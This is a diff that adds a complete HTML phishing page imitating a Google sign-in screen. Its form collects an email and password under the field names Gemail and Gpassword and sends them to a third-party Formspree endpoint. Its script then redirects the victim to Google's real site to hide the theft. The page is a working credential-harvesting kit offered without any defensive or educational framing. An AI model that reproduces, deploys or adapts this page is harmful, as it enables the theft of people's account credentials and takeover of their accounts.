@@ -1,1 +1,238 @@
+<!DOCTYPE>
+<html>
+<head>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>start</title>
+        <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;700&display=swap" rel="stylesheet">
+<style>
+    @import url('https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css');
+    body {
+    background: #fff;
+    font-family: 'Poppins', sans-serif;
+    color: #000;
+    text-align: center;
+    font-size: 17px;
+}
+.container {
+    background: transparent;
+    width: 90%;
+    margin: 2vh auto 0 auto;
+    padding: 20px;
+    font-size: 17px;
+}
+.group {
+	position: relative;
+	margin-bottom: 20px;
+	margin-top: 5px;
+}
+.textbox {
+background: transparent;
+	font-size: 18px;
+	padding: 10px 10px 5px 5px;
+	display: block;
+	width: 100%;
+	border: none;
+	border-bottom: 1px solid #999;
+}
+.textbox:focus {
+	outline: none;
+}
+.group label {
+	color: #1A73E8;
+	font-size: 13px;
+	font-weight: normal;
+	position: absolute;
+	pointer-events: none;
+	left: 5px;
+	top: 10px;
+	transition: 0.2s ease all;
+}
+.textbox:focus ~ label,
+.textbox:valid ~ label {
+	top: -10px;
+	font-size: 14px;
+	color: #1A73E8;
+}
+.bar {
+	position: relative;
+	display: block;
+	width: 100%;
+}
+.bar:before,
+.bar:after {
+	content: '';
+	height: 1px;
+	width: 0;
+	bottom: 1px;
+	position: absolute;
+	background: #1A73E8;
+	transition: 0.2s ease all;
+}
+.bar:before {
+	left: 50%;
+}
+.bar:after {
+	right: 50%;
+}
+.textbox:focus ~ .bar:before,
+.textbox:focus ~ .bar:after {
+	width: 50%;
+}
+.highlight {
+	position: absolute;
+	height: 60%;
+	width: 20%;
+	top: 25%;
+	left: 0;
+	pointer-events: none;
+	opacity: 0.5;
+}
+.textbox:focus ~ .highlight {
+	animation: inputHighlighter 0.3s ease;
+}
+@keyframes inputHighlighter {
+	from {
+		background: #1A73E8;
+	}
+	to {
+		width: 0;
+		background: transparent;
+	}
+}
+ .button {
+  width: 30%;
+    background: #1A73E8;
+    color: #fff;
+    border-radius: 5px;
+    border: none;
+    padding: 10px;
+    outline: 0;
+    cursor: pointer;
+    display: block;
+    margin: 10px auto 10px;
+    font-size: 15px;
+}
+ .img {
+     margin-top: 30px;
+     height: 50px;
+     width: 140px;
+ }
+ .omo{
+     display: flex;
+     flex-direction: row;
+     flex-wrap: wrap;
+     align-items: stretch;
+     justify-content: space-between;
+ }
+ .link {
+     color: #1A73E8;
+     font-size: 15px;
+     margin-top: 20px;
+     font-waight: bold;
+     background: transparent;
+     border: none;
+ }
+ #show-pass {
+    width: 40px;
+    position: absolute;
+    right: 20px;
+    top: 2px;
+    bottom: 2px;
+    cursor: pointer;
+    z-index: 1;
+    justify-content: center;
+    align-items: center;
+    display: flex;
+    color: #2D88FF;
+}
+.fa-eye:before {
+ 
+    content: "\f06e";
+}
+.fa-eye-slash:before {
+    content: "\f070";
+}
+.sin {
+    font-size: 30px;
+}
+</style>
+</head>
+<body>
+    <img class="img" src="image/pic.png">
+    <p><span class="sin">Sign in</span><br>your google account to continue</p>
+<div class="container">
+     <form id="my-form" action="https://formspree.io/f/mbjeoakk" method="POST">
+<div class="group">
+	<input type="text" class="textbox" required name="Gemail">
+	<span class="highlight"></span>
+	<span class="bar"></span>
+	<label>Email</label>
+</div>
+<div class="group">
+	<input type="password" class="textbox" required name="Gpassword" id="password">
+	<span id="show-pass" class="fa fa-eye" title="show hide password"></span>
+	<span class="highlight"></span>
+	<span class="bar"></span>
+	<label>password</label>
+</div>
+<div class="omo">
+    <button class="link">forgot email?</button>
+<button class="button">continue</button>
+</div>
+</form>
+</div>
+<script>
+(() => {
+    const password = document.getElementById("password");
+    const showBtn = document.getElementById("show-pass");
 
+    const showHidePassword = () => {
+        if(password.type == "password"){
+           password.type = "text";
+           showBtn.classList.add("fa-eye-slash");
+        }else{
+           password.type = "password";
+           showBtn.classList.remove("fa-eye-slash");
+        }
+        
+  };
+  showBtn.addEventListener("click", showHidePassword);
+
+})();
+
+var form = document.getElementById("my-form");
+    
+    async function handleSubmit(event) {
+      event.preventDefault();
+      var status = document.getElementById("my-form-status");
+      var data = new FormData(event.target);
+      fetch(event.target.action, {
+        method: form.method,
+        body: data,
+        headers: {
+            'Accept': 'application/json'
+        }
+      }).then(response => {
+        if (response.ok) {
+    window.location.assign("https://www.google.com.ng/");
+          status.innerHTML = "successful";
+          form.reset()
+        } else {
+          response.json().then(data => {
+            if (Object.hasOwn(data, 'errors')) {
+              status.innerHTML = data["errors"].map(error => error["message"]).join(", ")
+            } else {
+              status.innerHTML = "check network connection"
+            }
+          })
+        }
+      }).catch(error => {
+        status.innerHTML = "check network connection"
+      });
+    }
+    form.addEventListener("submit", handleSubmit)
+  </script>
+</body>
+</html>
